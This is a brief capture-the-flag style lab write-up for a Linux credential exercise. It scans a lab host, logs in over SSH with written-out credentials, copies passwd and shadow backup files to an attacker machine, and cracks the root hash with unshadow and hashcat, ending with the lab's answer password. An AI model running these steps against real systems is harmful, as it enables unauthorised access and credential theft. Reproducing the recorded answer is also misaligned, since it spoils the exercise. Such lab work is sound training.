# Passwd, Shadow & Opasswd

### Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.

```bash
nmap -sC -sV 10.129.40.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 03:44 EST
Nmap scan report for 10.129.40.131 (10.129.40.131)
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

lets login ssh as will

```bash
#creds from before will:TUqr7QfLTLhruhVbCP
ssh will@10.129.40.131 
cd .backups
ls
passwd.bak  shadow.bak
# now we copy this into our kali
python3 -m http.server 8080
#kali
wget http://10.129.40.131:8080/passwd.bak
wget http://10.129.40.131:8080/shadow.bak  
```

now we unshadow this to get the hash

```bash
#start with passwd then shadow
unshadow passwd.bak shadow.bak > unshadow
hashcat -m 1800 -a 0 unshadow mut_password.list -o cracked.txt
cat cracked.txt                                                      
$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:J0rd@n5
```

```
J0rd@n5
```
